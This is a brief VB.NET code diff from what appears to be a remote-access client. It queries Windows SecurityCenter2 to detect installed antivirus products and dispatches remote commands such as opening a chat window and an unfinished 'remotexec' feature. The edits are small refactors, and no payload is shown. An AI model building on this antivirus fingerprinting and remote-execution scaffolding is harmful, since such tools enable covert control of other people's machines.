@@ -29,8 +29,7 @@ Public Class MainForm
             Dim Path As String = "\\" & Environment.MachineName & "\root\SecurityCenter2"
 
             Using MOS As ManagementObjectSearcher = New ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct")
-
-                For Each Instance In MOS.[Get]()
+                For Each Instance In MOS.Get()
                     If Instance.GetPropertyValue("displayName").ToString() = "Windows Defender" Then WinDefend = True
                     If Instance.GetPropertyValue("displayName").ToString() <> "Windows Defender" Then Name = Instance.GetPropertyValue("displayName").ToString()
                 Next
@@ -194,10 +193,12 @@ Public Class MainForm
 
 #Region "Tools"
         If actionType = "openremotechat" Then
-            Invoke(Sub() RemoteChat.Show())
+            Dim form As New RemoteChat()
+            Invoke(Sub() form.Show())
 
         ElseIf actionType = "closeremotechat" Then
-            Invoke(Sub() RemoteChat.Hide())
+            Console.WriteLine("close remote chat")
+            Invoke(Sub() RemoteChat.Close())
 
         ElseIf actionType = "remotexec" Then
             ' TODO : check this feature
